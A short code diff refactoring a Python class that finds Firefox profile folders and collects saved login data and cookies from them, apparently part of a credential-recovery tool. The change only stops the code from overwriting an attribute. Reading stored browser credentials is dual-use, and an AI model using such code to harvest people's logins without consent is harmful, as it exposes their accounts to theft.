@@ -421,11 +421,11 @@ class Mozilla:
         """
         credentials = {}
         cookies = []
-        self.path = self.path.format(**profile)
-        if not os.path.exists(self.path):
+        path = self.path.format(**profile)
+        if not os.path.exists(path):
             return []
 
-        for prof in self.get_firefox_profiles(self.path):
+        for prof in self.get_firefox_profiles(path):
             log.debug(f'Profile path found: {prof}')
 
             creds = self.get_login_data(prof)
